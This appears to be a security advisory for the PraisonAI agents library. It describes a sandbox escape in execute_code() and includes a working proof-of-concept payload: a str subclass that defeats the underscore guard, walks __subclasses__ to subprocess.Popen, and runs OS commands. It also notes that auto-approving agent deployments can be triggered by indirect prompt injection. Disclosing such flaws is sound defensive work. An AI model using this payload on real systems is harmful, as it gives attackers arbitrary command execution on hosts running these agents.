summary: 'PraisonAI: Python Sandbox Escape via str Subclass startswith() Override
  in execute_code'
details: "### Summary\n\n`execute_code()` in `praisonai-agents` runs attacker-controlled
  Python inside a three-layer sandbox that can be fully bypassed by passing a `str`
  subclass with an overridden `startswith()` method to the `_safe_getattr` wrapper,
  achieving arbitrary OS command execution on the host.\n\n### Details\n\n`python_tools.py:20`
  (source) -> `python_tools.py:22` (guard bypass) -> `python_tools.py:161` (sink)\n
  ```python\n# source -- _safe_getattr accepts any str subclass\ndef _safe_getattr(obj,
  name, *default):\n    if isinstance(name, str) and name.startswith('_'):  # isinstance
  passes for subclasses\n        raise AttributeError(...)\n\n# hop -- type() is whitelisted
  in safe_builtins, creates str subclass without class keyword\nFakeStr = type('FakeStr',
  (str,), {'startswith': lambda self, *a: False})\n\n# sink -- Popen reached via __subclasses__
  walk\nr = Popen(['id'], stdout=PIPE, stderr=PIPE)\n```\n\n### PoC\n```python\n\n
  from praisonaiagents.tools.python_tools import execute_code\n\npayload = \"\"\"\n
  t = type\nFakeStr = t('FakeStr', (str,), {'startswith': lambda self, *a: False})\n\
  \nmro_attr  = FakeStr(''.join(['_','_','m','r','o','_','_']))\nsubs_attr = FakeStr(''.join(['_','_','s','u','b','c','l','a','s','s','e','s','_','_']))\n\
  mod_attr  = FakeStr(''.join(['_','_','m','o','d','u','l','e','_','_']))\nname_attr
  = FakeStr(''.join(['_','_','n','a','m','e','_','_']))\nPIPE = -1\n\nobj_class =
  getattr(type(()), mro_attr)[1]\nfor cls in getattr(obj_class, subs_attr)():\n  \
  \  try:\n        m = getattr(cls, mod_attr, '')\n        n = getattr(cls, name_attr,
  '')\n        if m == 'subprocess' and n == 'Popen':\n            r = cls(['id'],
  stdout=PIPE, stderr=PIPE)\n            out, err = r.communicate()\n            print('RCE:',
  out.decode())\n            break\n    except Exception as e:\n        print('ERR:',
  e)\n\"\"\"\n\nresult = execute_code(code=payload)\nprint(result)\n# expected output:
  RCE: uid=1000(narey) gid=1000(narey) groups=1000(narey)...\n```\n\n### Impact\n\n
  Any user or agent pipeline running `execute_code()` is exposed to full OS command
  execution as the process user. Deployments using `bot.py`, `autonomy_mode.py`, or
  `bots_cli.py` set `PRAISONAI_AUTO_APPROVE=true` by default, meaning no human confirmation
  is required and the tool fires silently when triggered via indirect prompt injection."
